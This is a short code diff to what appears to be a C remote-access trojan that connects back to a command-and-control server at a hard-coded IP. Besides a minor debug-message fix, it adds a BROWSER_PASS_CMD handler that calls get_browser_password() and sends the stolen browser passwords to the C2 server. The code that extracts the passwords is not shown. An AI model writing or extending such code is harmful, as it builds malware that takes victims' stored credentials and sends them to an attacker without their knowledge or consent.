@@ -10,6 +10,7 @@
 #include "client/screenshot.h"
 #include "common.h"
 #include "client/info.h"
+#include "client/browser_pass.h"
 
 #define SERVER_IP "192.168.100.100"
 
@@ -28,7 +29,7 @@ int main() {
 connect:
     // Attempt to connect to c2server
     while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
-        printf("[DEBUG] Attempting to connect to server");
+        printf("[DEBUG] Attempting to connect to server\n");
         sleep(3);
     }
 
@@ -62,6 +63,10 @@ connect:
             upload_file_to_server(sock, payload);
         } else if (cmd == UL_FILE_CMD) {
             download_file_from_server(sock, payload);
+        } else if (cmd == BROWSER_PASS_CMD) {
+            char* browser_password = get_browser_password();
+            safe_send(sock, browser_password, BROWSER_PASS_CMD, strlen(browser_password) + 1, 0);
+            free(browser_password);
         }
         free(payload);
     }
